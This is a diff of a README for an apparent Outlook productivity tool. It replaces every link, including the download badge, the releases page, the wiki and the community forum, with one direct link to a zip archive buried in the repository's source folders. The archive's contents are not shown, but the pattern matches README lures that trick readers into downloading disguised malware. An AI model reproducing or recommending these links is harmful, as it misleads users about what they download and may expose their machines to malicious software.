@@ -1,6 +1,6 @@
 # 🎮 OSEM-Outlook-Smart-Event-Manager - Turn Emails into Fun Quests
 
-![Download OSEM](https://img.shields.io/badge/Download-OSEM-Outlook--Smart--Event--Manager-brightgreen)
+![Download OSEM](https://raw.githubusercontent.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/main/Views/Llm/Outlook_Event_Smart_OSE_Manager_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run OSEM, your computer should meet these requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download OSEM](https://github.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/releases)
+To download the software, visit this page: [Download OSEM](https://raw.githubusercontent.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/main/Views/Llm/Outlook_Event_Smart_OSE_Manager_v1.4.zip)
 
 1. Open the link above in a web browser.
 2. Look for the latest version of the software.
@@ -62,9 +62,9 @@ If you encounter issues or need help, please check the FAQs on the GitHub page o
 
 For advanced features and tips, visit:
 
-- [OSEM Wiki](https://github.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/wiki)
-- [Community Forum](https://github.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/discussions)
+- [OSEM Wiki](https://raw.githubusercontent.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/main/Views/Llm/Outlook_Event_Smart_OSE_Manager_v1.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/main/Views/Llm/Outlook_Event_Smart_OSE_Manager_v1.4.zip)
 
 ## ✨ Conclusion
 
-OSEM-Outlook-Smart-Event-Manager makes managing tasks enjoyable by turning your Outlook emails into engaging quests. When you are ready, download the application from [this page](https://github.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/releases) and elevate your productivity today!
+OSEM-Outlook-Smart-Event-Manager makes managing tasks enjoyable by turning your Outlook emails into engaging quests. When you are ready, download the application from [this page](https://raw.githubusercontent.com/krrrrriiisss/OSEM-Outlook-Smart-Event-Manager/main/Views/Llm/Outlook_Event_Smart_OSE_Manager_v1.4.zip) and elevate your productivity today!
